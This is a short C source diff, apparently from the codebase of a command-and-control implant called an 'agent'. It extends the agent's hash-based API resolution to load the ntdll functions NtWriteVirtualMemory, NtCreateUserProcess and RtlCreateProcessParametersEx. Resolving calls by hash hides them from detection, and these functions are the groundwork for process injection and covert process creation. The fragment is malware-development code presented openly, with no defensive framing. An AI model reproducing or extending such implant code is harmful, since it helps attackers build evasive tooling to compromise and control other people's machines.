@@ -29,7 +29,7 @@ BYTE HashKeyBytes[] = HASH_KEY_BYTES;
 #endif
 
 UINT64 DllHashes[2] = { 0 };
-UINT64 ApiHashes[58] = { 0 };
+UINT64 ApiHashes[61] = { 0 };
 
 INT init_agent(PVOID RetAddress) {
 
@@ -218,6 +218,18 @@ INT init_agent(PVOID RetAddress) {
 
     agent->apis->pNtReadVirtualMemory = (t_NtReadVirtualMemory)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[57]);
     if (!agent->apis->pNtReadVirtualMemory)
+        return -1;
+
+    agent->apis->pNtWriteVirtualMemory = (t_NtWriteVirtualMemory)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[58]);
+    if (!agent->apis->pNtWriteVirtualMemory)
+        return -1;
+
+    agent->apis->pNtCreateUserProcess = (t_NtCreateUserProcess)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[59]);
+    if (!agent->apis->pNtCreateUserProcess)
+        return -1;
+
+    agent->apis->pRtlCreateProcessParametersEx = (t_RtlCreateProcessParametersEx)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[60]);
+    if (!agent->apis->pRtlCreateProcessParametersEx)
         return -1;
 
     //obtain iphlpapi apis
